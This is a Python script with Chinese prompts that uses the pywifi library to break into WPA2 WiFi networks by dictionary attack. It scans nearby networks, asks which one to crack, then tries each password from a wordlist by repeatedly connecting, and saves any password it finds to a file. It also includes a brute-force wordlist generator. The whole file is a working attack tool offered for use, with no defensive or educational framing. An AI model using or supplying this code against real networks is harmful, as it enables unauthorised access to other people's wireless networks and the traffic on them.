# -*- coding: utf-8 -*-


import time
import pywifi
from pywifi import const
import itertools as its

maclist = []
wificount = 15


def product_passwd(length):
    words = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    r = its.product(words, repeat=length)
    dic = open('paswwer.txt', 'a')

    for i in r:
        dic.write(''.join(i))
        dic.write(''.join('\n'))
        print(i)

    dic.close()
    print('密码本生成完毕！')


#product_passwd(int(input("请输入要生成的密码本密码长度:")))


def getwifi():
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    ifaces.scan()
    time.sleep(3)
    result = ifaces.scan_results()

    n = 0
    print("%12s%20s%20s" % ("【无线名称】", "【mac地址】", "【信号强度】"))
    print("=" * 60)
    for data in result:
        if (data.bssid not in maclist):
            maclist.append(data.bssid)
            if n <= wificount:
                print("%14s%30s%15s" % (data.ssid, data.bssid, data.signal))
                n = n + 1
                time.sleep(2)
    print("=" * 60)


class PoJie():
    def __init__(self, path):
        self.file = open(path, "r", errors="ignore")
        wifi = pywifi.PyWiFi()
        self.iface = wifi.interfaces()[0]
        print("获取到的无线网卡：")
        print(self.iface.name())
        self.iface.disconnect()
        time.sleep(1)
        assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

    def readPassWord(self):
        print("开始破解：")
        while True:
            try:
                passStr = str(self.file.readline())
                print(" 正在尝试：" + passStr)
                if not passStr:
                    break
                bool1 = self.test_connect(passStr)
                if bool1:
                    print("恭喜你，找到密码! 正确密码为：" + passStr)
                    break
                else:
                    print(" 密码错误!\n", "=" * 35)
                    time.sleep(3)
            except:
                continue
        with open('result.txt', 'a+') as fw:
            fw.write('WiFi名称：%s  密码：%s' % (wifiname, passStr))

    def test_connect(self, findStr):
        profile = pywifi.Profile()
        profile.ssid = wifiname
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = findStr
        self.iface.remove_all_network_profiles()
        tmp_profile = self.iface.add_network_profile(profile)
        self.iface.connect(tmp_profile)
        time.sleep(3)
        if self.iface.status() == const.IFACE_CONNECTED:
            isOK = True
        else:
            isOK = False
        self.iface.disconnect()
        time.sleep(1)
        return isOK

    def __del__(self):
        self.file.close()


getwifi()
wifiname = input("请输入要破解的WiFi名称:")  # wifi名称)
path = "E:\\Work_Files\\PythonProject\\pywifi\\xinyang_pywifi.txt.txt"
# r"D://Data/Python/wifi/dictionary.txt"
start = PoJie(path=path)
start.readPassWord()